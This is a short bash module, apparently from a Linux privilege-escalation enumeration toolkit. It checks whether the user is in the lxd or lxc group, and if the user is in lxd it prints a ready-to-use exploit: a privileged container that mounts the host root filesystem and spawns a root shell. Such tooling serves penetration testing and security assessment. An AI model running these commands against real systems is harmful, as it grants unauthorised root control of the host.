#!/bin/bash
source "$(dirname "$0")/00_common.sh"

info "Checking LXD/LXC..."

if groups 2>/dev/null | grep -qw lxd; then
    success "VULNERABLE: User in lxd group!"
    echo ""
    echo "Exploit:"
    echo "  lxc init ubuntu:18.04 privesc -c security.privileged=true"
    echo "  lxc config device add privesc host-root disk source=/ path=/mnt/root"
    echo "  lxc start privesc"
    echo "  lxc exec privesc -- /bin/bash"
elif groups 2>/dev/null | grep -qw lxc; then
    success "User in lxc group"
else
    fail "Not in lxd/lxc group"
fi
